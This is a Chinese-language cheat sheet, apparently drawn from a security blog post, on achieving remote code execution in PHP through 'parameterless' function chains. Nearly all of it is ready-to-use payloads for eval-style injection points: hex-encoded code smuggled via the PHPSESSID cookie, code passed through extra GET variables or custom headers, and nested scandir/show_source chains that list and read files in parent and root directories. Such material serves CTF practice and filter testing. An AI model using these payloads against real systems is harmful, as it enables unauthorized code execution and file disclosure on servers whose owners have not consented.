# 无参数RCE

---

- 来源：https://xz.aliyun.com/t/10212

  无参数：函数里面没有参数

  方法1：
  
  ```
  (hex("phpinfo();")=706870696e666f28293b) 
  将php代码变成16进制放到cookie中，交到get请求去执行
  
  ?code=eval(hex2bin(session_id(session_start())));
  header：
Cookie:PHPSESSID=706870696e666f28293b
  ```

  方法2：
  
  ```
  end() - 将内部指针指向数组中的最后一个元素，并输出。
  next() - 将内部指针指向数组中的下一个元素，并输出。
  prev() - 将内部指针指向数组中的上一个元素，并输出。
  reset() - 将内部指针指向数组中的第一个元素，并输出。
  each() - 返回当前元素的键名和键值，并将内部指针向前移动。
  current() -输出数组中的当前元素的值。
  
  Array{
  	[code]=>print_r(current(get_defined_vars()));
  	[b]=>phpinfo();
  }
  
  ?code=print_r(current(get_defined_vars()));&b=phpinfo();  # 查看整个数组
?code=eval(end(current(get_defined_vars())));&b=phpinfo(); # 执行phpinfo()
  ```

  方法3
  
  ```
  ?code=print_r(getallheaders());  # 输出头部参数和对应值的数组
  
  ?code=eval(next(getallheaders()));
  header:（增加xxx）
xxx:phpinfo();
  ```

  方法4
  
  ```
?code=print_r(getenv(phpinfo()));   # 获取环境变量值，getenv只适用php>7.1
  ```

  方法5
  
  ```
  scandir()  //函数返回指定目录中的文件和目录的数组。
  localeconv()   //返回一包含本地数字及货币格式信息的数组。
  current()     //返回数组中的单元，默认取第一个值。
  pos是current的别名
  getcwd()      //取得当前工作目录
  dirname()     //函数返回路径中的目录部分。
  array_flip()  //交换数组中的键和值，成功时返回交换后的数组
  array_rand()  //从数组中随机取出一个或多个单元
  array_flip()和array_rand()配合使用可随机返回当前目录下的文件名
  dirname(chdir(dirname()))配合切换文件路径
  
  
  print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
  print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
  show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
  show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
  show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
  show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
  print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));  //查看和读取根目录文件
if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));  //查看和读取根目录文件
  ```
  
  